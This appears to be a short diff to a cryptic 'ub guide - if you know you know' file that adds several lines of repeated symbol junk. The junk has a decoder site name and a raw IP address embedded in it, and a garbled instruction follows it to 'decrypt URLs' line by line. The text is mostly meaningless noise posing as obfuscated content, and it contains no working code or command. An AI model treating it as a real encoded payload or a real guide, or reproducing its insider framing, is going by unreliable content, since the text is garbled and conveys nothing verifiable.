@@ -1,6 +1,11 @@
 # ub guide - if you know you know
 
-||||P9dfs*&(bdsf|base64decode.org|(|216.105.168.10||*(&)||$%^&*(
+|*(&)||$%^&*(||||)||$%P9dfs*&(bd||||P9dfs*&(bd|||P9dfs*&(b|||P9dfs*&(b
+||||P9dfs*&(bdsf|base64decode.org|(|216.105.168.10||*(&)||$%^&*(|||P9dfs*&(b
+|*(&)||$%^&*(|*(&)||$%^&*(&)|&)|&)|&)||$%&)||$%&)||$%|||P9dfs*&(b
+|*(&)||$%^&*(|*(&)||$%^&*(*(|*(&)||$%^&*(|||P9dfs*&(b|||P9dfs*&(b
+|*(&)||$%^&*(|*(&)||$%^&*(|||P9dfs*&(b|||P9dfs*&(b|||P9dfs*&(b
+|*(&)||$%^&*(|*(&)||$%^&*(|||P9dfs*&(b|||P9dfs*&(b|||P9dfs*&(b
 
 dcrpt urlz and tik za "dcude ich line zeperedly"
 
